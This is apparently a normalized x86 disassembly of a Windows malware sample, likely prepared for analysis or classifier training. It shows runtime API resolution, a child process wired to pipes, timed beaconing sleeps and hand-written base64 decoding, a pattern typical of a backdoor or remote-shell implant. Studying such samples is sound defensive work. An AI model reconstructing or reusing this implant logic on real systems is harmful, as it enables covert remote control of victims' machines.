sub eax 0x5
pop eax
push [ ebp - 0x53c ]
call [ ebp - 0x538 ]
push [ ebp - 0x540 ]
call [ ebp - 0x538 ]
push [ ebp - 0x55c ]
call [ ebp - 0x560 ]
lea eax [ ebp - 0x234 ]
push eax
call [ ebp - 0x58c ]
pop ecx
push [ ebp - 0x53c ]
mov edi eax
call [ ebp - 0x538 ]
push [ ebp - 0x540 ]
call [ ebp - 0x538 ]
push edi
jmp r-xdata
push [ ebp - 0x53c ]
call [ ebp - 0x538 ]
push [ ebp - 0x540 ]
call [ ebp - 0x538 ]
push [ esi + 0x4c0 ]
push esi
call [ ebp - 0x544 ]
push [ ebp - 0x53c ]
call [ ebp - 0x538 ]
push [ ebp - 0x540 ]
call [ ebp - 0x538 ]
push 0x20
pop eax
push eax
mov [ ebp - 0x564 ] eax
lea eax [ ebp + 0x50 ]
push eax
call [ ebp - 0x548 ]
lea eax [ ebp - 0x558 ]
push eax
lea eax [ esi + 0x60 ]
push eax
push [ esi + 0xc0 ]
call [ ebp - 0x598 ]
lea eax [ ebp - 0x564 ]
push eax
lea eax [ ebp + 0x50 ]
push eax
lea eax [ ebp - 0x57c ]
push eax
push ebx
lea edi [ esi + 0xa0 ]
push edi
push [ ebp - 0x558 ]
call [ ebp - 0x5b8 ]
lea eax [ ebp - 0x134 ]
push eax
lea eax [ ebp + 0x50 ]
push eax
call [ ebp - 0x570 ]
test eax eax
je r-xdata
sub_402370
push ebp
lea ebp [ esp - 0x7c8 ]
sub esp 0xa30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x7c4 ] eax
push ebx
push esi
mov esi [ ebp + 0x7d0 ]
lea eax [ esi + 0x6d4 ]
push eax
call [ esi + 0x698 ]
xor ebx ebx
mov [ ebp + 0x68 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x7c4 ]
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
add ebp 0x7c8
leave
retn 0x8
push edi
lea eax [ esi + 0x6a4 ]
push eax
call [ esi + 0x698 ]
mov edi eax
mov [ ebp + 0x30 ] edi
cmp edi ebx
je r-xdata
pop edi
lea eax [ esi + 0x6c4 ]
push eax
call [ esi + 0x698 ]
mov [ ebp + 0x7c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7a4 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x44 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x850 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x1c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xa8e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x38 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x840 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x10 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc3e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x5c ] eax
cmp eax ebx
je r-xdata
mov eax [ esi + 0xd2e ]
mov [ ebp + 0x3c ] eax
cmp eax ebx
je r-xdata
mov eax [ esi + 0xd32 ]
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
mov eax [ esi + 0xd3a ]
mov [ ebp + 0x48 ] eax
cmp eax ebx
je r-xdata
lea edi [ esi + 0x9a6 ]
push edi
push [ ebp + 0x7c ]
call [ esi + 0x69c ]
mov [ ebp + 0x54 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x976 ]
push eax
push [ ebp + 0x7c ]
call [ esi + 0x69c ]
mov [ ebp + 0x2c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x97e ]
push eax
push [ ebp + 0x7c ]
call [ esi + 0x69c ]
mov [ ebp + 0x24 ] eax
cmp eax ebx
je r-xdata
push edi
push [ ebp + 0x7c ]
call [ esi + 0x69c ]
mov [ ebp + 0x18 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x9be ]
push eax
push [ ebp + 0x7c ]
call [ esi + 0x69c ]
mov [ ebp + 0x58 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x9ce ]
push eax
push [ ebp + 0x7c ]
call [ esi + 0x69c ]
mov [ ebp + 0x50 ] eax
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x30 ]
lea eax [ esi + 0xc4e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x20 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc8e ]
push eax
push [ ebp + 0x68 ]
call [ esi + 0x69c ]
mov [ ebp ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc5e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x64 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x8b4 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x78 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc36 ]
push eax
push [ ebp + 0x68 ]
call [ esi + 0x69c ]
mov [ ebp + 0x34 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xcbe ]
push eax
push [ ebp + 0x68 ]
call [ esi + 0x69c ]
mov [ ebp + 0x40 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xcce ]
push eax
push [ ebp + 0x68 ]
call [ esi + 0x69c ]
mov [ ebp + 0x14 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xa9e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x28 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x77c ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x60 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7d8 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x4c ] eax
cmp eax ebx
je r-xdata
push 0x12b
lea eax [ ebp + 0x68d ]
push ebx
push eax
mov [ ebp + 0x80 ] ebx
mov [ ebp + 0x74 ] ebx
mov [ ebp + 0x68c ] bl
call sub_4046e0
push 0x3ff
lea eax [ ebp + 0x85 ]
push ebx
push eax
mov [ ebp + 0x84 ] bl
call sub_4046e0
xor eax eax
mov [ ebp + 0x7b8 ] bl
lea edi [ ebp + 0x7b9 ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
mov edi [ esi + 0x704 ]
add esp 0x18
mov [ ebp + 0x4 ] 0x6
mov [ ebp + 0x8 ] ebx
cmp edi ebx
je r-xdata
mov [ ebp - 0xc ] 0xc
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
lea eax [ ebp + 0x588 ]
push eax
push 0x104
call [ ebp + 0x44 ]
lea eax [ esi + 0x4d8 ]
push eax
lea eax [ ebp + 0x588 ]
push eax
call [ ebp + 0x64 ]
jmp r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp + 0x74 ]
push eax
lea eax [ ebp + 0x80 ]
push eax
mov [ ebp + 0x70 ] ebx
call [ ebp + 0x38 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] 0x44
call [ ebp + 0x10 ]
mov eax [ ebp + 0x74 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] ax
lea eax [ esi + 0xd0e ]
push eax
lea eax [ ebp + 0x68c ]
push eax
mov [ ebp - 0x24 ] 0x101
call [ ebp + 0x64 ]
push 0x1000
push edi
call [ ebp + 0x78 ]
lea eax [ ebp + 0x588 ]
push eax
push edi
call [ ebp + 0x64 ]
push edi
call [ ebp + 0x5c ]
push eax
mov [ ebp + 0x6c ] eax
movzx eax [ esi + 0x15 ]
push eax
push edi
call [ ebp + 0x3c ]
mov eax [ ebp + 0x7d4 ]
mov [ ebp - 0x160 ] eax
lea eax [ ebp + 0x4 ]
push eax
push ebx
lea eax [ ebp - 0x164 ]
push eax
push ebx
push ebx
mov [ ebp - 0x164 ] 0x1
call [ ebp + 0x54 ]
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
call [ ebp + 0x50 ]
jmp r-xdata
lea eax [ ebp - 0x164 ]
push eax
push [ ebp + 0x7d4 ]
call [ ebp + 0x58 ]
test eax eax
je r-xdata
cmp [ ebp + 0x80 ] ebx
je r-xdata
mov eax [ ebp + 0x7d4 ]
push 0x1000
push edi
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x268 ] 0x1
call [ ebp + 0x78 ]
push ebx
push ebx
push ebx
lea eax [ ebp - 0x268 ]
push eax
push ebx
call [ ebp + 0x54 ]
cmp eax 0xffffffff
je r-xdata
push ebx
push 0x4
push 0xa
lea eax [ ebp + 0x7b8 ]
push eax
push [ ebp + 0x6c ]
call [ ebp + 0x34 ]
add esp 0xc
push eax
push [ ebp + 0x7d4 ]
call [ ebp + 0x2c ]
push [ ebp + 0x6c ]
push edi
push [ ebp + 0x7d4 ]
push esi
call [ ebp + 0x48 ]
cmp [ ebp + 0x74 ] ebx
je r-xdata
push [ ebp + 0x80 ]
call [ ebp + 0x60 ]
lea eax [ ebp - 0x268 ]
push eax
push [ ebp + 0x7d4 ]
call [ ebp + 0x58 ]
test eax eax
je r-xdata
push [ ebp + 0x7c ]
add esi 0x6a0
call [ esi ]
push [ ebp + 0x30 ]
call [ esi ]
push [ ebp + 0x68 ]
call [ esi ]
push [ ebp + 0x74 ]
call [ ebp + 0x60 ]
push ebx
push 0xfff
push edi
push [ ebp + 0x7d4 ]
call [ ebp + 0x24 ]
cmp eax 0xffffffff
je r-xdata
push [ ebp + 0x7d4 ]
call [ ebp + 0x18 ]
push eax
movzx eax [ esi + 0x15 ]
push eax
push edi
call [ ebp + 0xc ]
push 0x4
lea eax [ esi + 0x4cc ]
push eax
push edi
call [ ebp + 0x40 ]
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4d4 ]
push 0x2
push eax
push edi
call [ ebp + 0x40 ]
add esp 0xc
test eax eax
jne r-xdata
push edi
call [ ebp + 0x5c ]
push eax
lea eax [ ebp + 0x68c ]
push edi
push eax
call [ ebp + 0x14 ]
add esp 0xc
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
push ebx
push ebx
push 0x10
push 0x1
push ebx
push ebx
lea eax [ ebp + 0x68c ]
push eax
push ebx
call [ ebp + 0x28 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4d4 ]
push eax
push edi
call [ ebp ]
pop ecx
pop ecx
add eax 0x3
push eax
lea eax [ ebp + 0x484 ]
push eax
call [ ebp + 0x20 ]
lea eax [ ebp + 0x484 ]
push eax
call [ ebp + 0x1c ]
test eax eax
je r-xdata
push 0x12c
lea eax [ ebp + 0x68c ]
push eax
call [ ebp + 0x78 ]
push [ ebp + 0x74 ]
call [ ebp + 0x60 ]
jmp r-xdata
push 0x400
lea eax [ ebp + 0x84 ]
push eax
call [ ebp + 0x78 ]
push ebx
lea eax [ ebp + 0x70 ]
push eax
push 0x3ff
lea eax [ ebp + 0x84 ]
push eax
push [ ebp + 0x80 ]
call [ ebp + 0x4c ]
cmp [ ebp + 0x70 ] ebx
jne r-xdata
push 0x1000
push edi
call [ ebp + 0x78 ]
lea eax [ ebp + 0x84 ]
push eax
push edi
call [ ebp + 0x64 ]
push edi
call [ ebp + 0x5c ]
push eax
mov [ ebp + 0x6c ] eax
movzx eax [ esi + 0x15 ]
push eax
push edi
call [ ebp + 0x3c ]
push 0xa
lea eax [ ebp + 0x7b8 ]
push eax
push [ ebp + 0x6c ]
call [ ebp + 0x34 ]
mov eax [ ebp + 0x7d4 ]
add esp 0xc
mov [ ebp - 0x160 ] eax
lea eax [ ebp + 0x4 ]
push eax
push ebx
lea eax [ ebp - 0x164 ]
push eax
push ebx
push ebx
mov [ ebp - 0x164 ] 0x1
call [ ebp + 0x54 ]
cmp eax 0xffffffff
je r-xdata
push [ ebp + 0x80 ]
call [ ebp + 0x60 ]
lea eax [ ebp - 0x164 ]
push eax
push [ ebp + 0x7d4 ]
call [ ebp + 0x58 ]
test eax eax
je r-xdata
push ebx
push 0x4
lea eax [ ebp + 0x7b8 ]
push eax
push [ ebp + 0x7d4 ]
call [ ebp + 0x2c ]
cmp eax 0xffffffff
je r-xdata
push [ ebp + 0x6c ]
push edi
push [ ebp + 0x7d4 ]
push esi
call [ ebp + 0x48 ]
sub_402a07
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x6c4 ]
push eax
call [ esi + 0x698 ]
mov edi eax
xor ebx ebx
cmp edi ebx
jne r-xdata
lea eax [ esi + 0x976 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ esi + 0x9be ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
lea eax [ esi + 0x9a6 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x493e0
jle r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
cmp edi ebx
jg r-xdata
push ebx
push edi
push [ ebp + 0x10 ]
push esi
call [ ebp - 0x4 ]
cmp eax ebx
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
lea eax [ ebp - 0x114 ]
push eax
push ebx
push ebx
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x114 ] 0x1
call [ ebp + 0x8 ]
lea eax [ ebp - 0x114 ]
push eax
push esi
call [ ebp - 0x8 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax edi
jmp r-xdata
add [ ebp + 0x10 ] eax
sub edi eax
sub_402ae3
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x6a4 ]
lea edi [ esi + 0x698 ]
push eax
call [ edi ]
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
pop edi
pop esi
leave
retn 0xc
lea eax [ esi + 0x6d4 ]
push eax
call [ edi ]
mov edi eax
mov [ ebp - 0x10 ] edi
test edi edi
je r-xdata
lea eax [ esi + 0xc06 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
lea eax [ esi + 0xbfe ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push ebx
lea eax [ esi + 0xc0e ]
push eax
push edi
call [ esi + 0x69c ]
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
lea eax [ esi + 0x78c ]
push eax
push [ ebp + 0x8 ]
call [ esi + 0x69c ]
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
mov edi [ ebp + 0x10 ]
imul edi edi 0xa
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x3c
pop edi
imul edi edi 0xea60
push edi
call eax
push 0x0
call [ ebp - 0x4 ]
push eax
call [ ebp - 0x8 ]
pop ecx
pop ecx
call ebx
xor edx edx
div edi
cmp edx 0x5
ja r-xdata
imul edx edx 0xea60
push edx
call [ ebp - 0xc ]
jmp r-xdata
push 0x3
pop edx
push [ ebp - 0x10 ]
add esi 0x6a0
call [ esi ]
push [ ebp + 0x8 ]
call [ esi ]
sub_402bd0
sub esp 0x18
push ebx
mov ebx [ esp + 0x20 ]
push esi
lea eax [ ebx + 0x6d4 ]
push eax
call [ ebx + 0x698 ]
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
add esp 0x18
retn 0xc
push edi
lea eax [ ebx + 0x6a4 ]
push eax
call [ ebx + 0x698 ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebx + 0xc6e ]
push eax
push edi
call [ ebx + 0x69c ]
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
pop edi
lea eax [ ebx + 0xc8e ]
push eax
push esi
call [ ebx + 0x69c ]
mov esi eax
test esi esi
jne r-xdata
push ebp
lea eax [ ebx + 0xc3e ]
push eax
push edi
call [ ebx + 0x69c ]
mov ebp eax
mov [ esp + 0x24 ] ebp
test ebp ebp
je r-xdata
xor eax eax
lea eax [ ebx + 0x38 ]
push eax
push [ esp + 0x34 ]
call esi
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
lea eax [ ebx + 0x40 ]
push eax
push [ esp + 0x34 ]
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
sub eax edi
sub eax 0x4
push eax
add edi 0x5
push edi
lea esi [ ebx + 0x2f8 ]
push esi
call [ esp + 0x28 ]
push esi
call ebp
mov ebp eax
test ebp ebp
jne r-xdata
and [ esp + 0x14 ] 0x0
add ebx 0x338
lea ecx [ ebp - 0x4 ]
mov [ esp + 0x10 ] esi
mov [ esp + 0x30 ] ebx
test ecx ecx
jle r-xdata
push esi
call sub_405460
pop ecx
mov ebp eax
cmp [ esp + 0x14 ] ebp
jge r-xdata
dec ecx
shr ecx 0x2
inc ecx
mov eax ecx
shl eax 0x2
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x30 ]
mov esi [ esp + 0x2c ]
mov [ eax ] 0x0
lea eax [ esi + 0x338 ]
cmp [ eax ] 0x75
jne r-xdata
sub ebp [ esp + 0x14 ]
xor edx edx
mov eax ebp
mov [ esp + 0x14 ] edx
test eax eax
jle r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
jg r-xdata
cmp [ esi + 0x339 ] 0x67
jne r-xdata
or ecx 0xffffffff
cmp dl 0x41
jl r-xdata
push eax
push [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
call sub_404a50
mov edx [ esp + 0x20 ]
add esp 0xc
cmp al 0x30
jl r-xdata
cmp al 0x7a
jg r-xdata
movsx edi al
sub edi 0x41
jmp r-xdata
push eax
call [ esp + 0x28 ]
dec eax
push eax
add esi 0x33a
push esi
push [ esp + 0x3c ]
call [ esp + 0x28 ]
xor eax eax
inc eax
jmp r-xdata
cmp dl 0x61
jl r-xdata
cmp dl 0x5a
jg r-xdata
cmp al 0x2b
jne r-xdata
cmp al 0x39
jg r-xdata
movsx edi al
sub edi 0x47
jmp r-xdata
mov edx eax
shr edx 0x8
mov bl dl
sub bl 0x41
cmp bl 0x19
ja r-xdata
pop ebp
cmp dl 0x30
jl r-xdata
cmp dl 0x7a
jg r-xdata
movsx ecx dl
sub ecx 0x41
jmp r-xdata
cmp al 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
movsx edi al
add edi 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx dl
sub ecx 0x41
jmp r-xdata
cmp dl 0x2b
jne r-xdata
cmp dl 0x39
jg r-xdata
movsx ecx dl
sub ecx 0x47
jmp r-xdata
shr edx 0x8
mov bl dl
or edi 0xffffffff
sub bl 0x41
mov eax edi
cmp bl 0x19
ja r-xdata
push 0x3f
pop edi
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx dl
sub ecx 0x47
jmp r-xdata
mov esi ecx
shl esi 0x2
sar esi 0x6
mov ecx edi
shl ecx 0x2
or esi ecx
mov bl dl
sub bl 0x41
and esi 0xff
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp dl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
movsx ecx dl
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
cmp dl 0x2b
jne r-xdata
movsx ecx dl
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx dl
sub ecx 0x41
jmp r-xdata
push 0x3f
pop ecx
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
mov esi [ esp + 0x30 ]
shl eax 0x2
sar eax 0x6
shl cl 0x2
or al cl
mov [ esi ] al
inc esi
mov [ esp + 0x30 ] esi
cmp dl 0x3d
je r-xdata
cmp dl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx dl
sub ecx 0x47
jmp r-xdata
shr eax 0x10
mov bl al
sub bl 0x41
or edx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
mov edx [ esp + 0x14 ]
mov eax edx
shr eax 0x10
cmp al 0x3d
je r-xdata
mov ebx [ esp + 0x14 ]
shr ebx 0x10
cmp bl 0x3d
je r-xdata
push 0x3f
pop ecx
cmp dl 0x2b
jne r-xdata
movsx ecx dl
add ecx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx edx al
sub edx 0x41
jmp r-xdata
cmp dl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
shr edx 0x18
cmp edx 0x3d
je r-xdata
mov al dl
sub al 0x41
mov ecx edi
cmp al 0x19
ja r-xdata
cmp dl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx edx al
sub edx 0x47
jmp r-xdata
mov edi edx
shl edi 0x2
sar edi 0x4
shl ecx 0x4
or edi ecx
mov dl al
sub dl 0x41
and edi 0xff
or ecx 0xffffffff
cmp dl 0x19
ja r-xdata
push 0x3f
pop eax
mov bl al
sub bl 0x41
mov ecx edi
cmp bl 0x19
ja r-xdata
mov al dl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx ecx dl
sub ecx 0x41
jmp r-xdata
push 0x3f
pop ecx
cmp al 0x2b
jne r-xdata
movsx edx al
add edx 0x4
jmp r-xdata
mov dl al
sub dl 0x61
cmp dl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov al dl
sub al 0x30
cmp al 0x9
ja r-xdata
movsx ecx dl
sub ecx 0x47
jmp r-xdata
mov dl bl
sub dl 0x41
mov eax edi
cmp dl 0x19
ja r-xdata
cmp al 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
mov dl al
sub dl 0x30
cmp dl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov eax [ esp + 0x20 ]
shr eax 0x18
mov bl al
sub bl 0x41
or edx 0xffffffff
cmp bl 0x19
ja r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov bl dl
sub bl 0x41
mov eax edi
cmp bl 0x19
ja r-xdata
cmp dl 0x2b
jne r-xdata
movsx ecx dl
add ecx 0x4
jmp r-xdata
mov dl bl
sub dl 0x61
cmp dl 0x19
ja r-xdata
movsx eax bl
sub eax 0x41
jmp r-xdata
push 0x3f
pop edx
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx edx al
sub edx 0x41
jmp r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
cmp dl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
mov dl bl
sub dl 0x30
cmp dl 0x9
ja r-xdata
movsx eax bl
sub eax 0x47
jmp r-xdata
shl eax 0x2
sar eax 0x4
shl cl 0x4
or al cl
mov [ esi ] al
inc esi
mov [ esp + 0x30 ] esi
cmp al 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx edx al
sub edx 0x47
jmp r-xdata
add [ esp + 0x10 ] 0x4
mov eax edx
shl eax 0x2
sar eax 0x2
shl ecx 0x6
or eax ecx
mov ecx [ esp + 0x30 ]
add [ esp + 0x30 ] 0x3
and eax 0xff
shl eax 0x8
or eax edi
shl eax 0x8
or eax esi
dec [ esp + 0x18 ]
mov [ ecx ] eax
jne r-xdata
cmp al 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
shl eax 0x2
sar eax 0x2
shl cl 0x6
or al cl
mov [ esi ] al
inc esi
mov [ esp + 0x30 ] esi
push 0x3f
pop ecx
cmp bl 0x2b
jne r-xdata
movsx eax bl
add eax 0x4
jmp r-xdata
push 0x3f
pop ecx
cmp al 0x2b
jne r-xdata
movsx edx al
add edx 0x4
jmp r-xdata
mov eax [ esp + 0x10 ]
mov eax [ eax ]
or ecx 0xffffffff
cmp al 0x41
mov [ esp + 0x20 ] eax
mov edi ecx
jl r-xdata
push 0x3f
pop ecx
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
cmp bl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
cmp al 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
cmp dl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
push 0x3f
pop eax
push 0x3f
pop edx
push 0x3f
pop eax
sub_403192
push ebp
lea ebp [ esp - 0x74 ]
sub esp 0x3b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x70 ] eax
push ebx
push esi
mov esi [ ebp + 0x7c ]
push edi
lea eax [ esi + 0x6c4 ]
push eax
call [ esi + 0x698 ]
mov edi eax
xor ebx ebx
mov [ ebp - 0x210 ] edi
cmp edi ebx
je r-xdata
xor eax eax
lea eax [ esi + 0x6d4 ]
push eax
call [ esi + 0x698 ]
mov [ ebp - 0x1e0 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x6a4 ]
push eax
call [ esi + 0x698 ]
mov [ ebp - 0x1dc ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc9e ]
push eax
push [ ebp - 0x1e0 ]
call [ esi + 0x69c ]
mov [ ebp - 0x224 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc3e ]
push eax
push [ ebp - 0x1dc ]
call [ esi + 0x69c ]
mov [ ebp - 0x218 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x91e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x220 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc2e ]
push eax
push [ ebp - 0x1e0 ]
call [ esi + 0x69c ]
mov [ ebp - 0x1e4 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xcbe ]
push eax
push [ ebp - 0x1e0 ]
call [ esi + 0x69c ]
mov [ ebp - 0x1fc ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x754 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x228 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x92e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x230 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x986 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x1e8 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x95e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x238 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x93e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x1f0 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x96e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x23c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x996 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x1f8 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x976 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x20c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x9a6 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x214 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x97e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x21c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x9be ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x22c ] eax
cmp eax ebx
jne r-xdata
lea eax [ esi + 0x9ae ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x208 ] eax
cmp eax ebx
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ esi + 0x8b4 ]
push eax
push [ ebp - 0x1dc ]
call [ esi + 0x69c ]
mov [ ebp - 0x234 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x70 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
add ebp 0x74
leave
retn 0x4
lea eax [ esi + 0xc7e ]
push eax
push [ ebp - 0x1dc ]
call [ esi + 0x69c ]
mov [ ebp - 0x1f4 ] eax
cmp eax ebx
je r-xdata
mov eax [ esi + 0xd22 ]
mov [ ebp - 0x200 ] eax
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp + 0x48 ] bl
lea edi [ ebp + 0x49 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
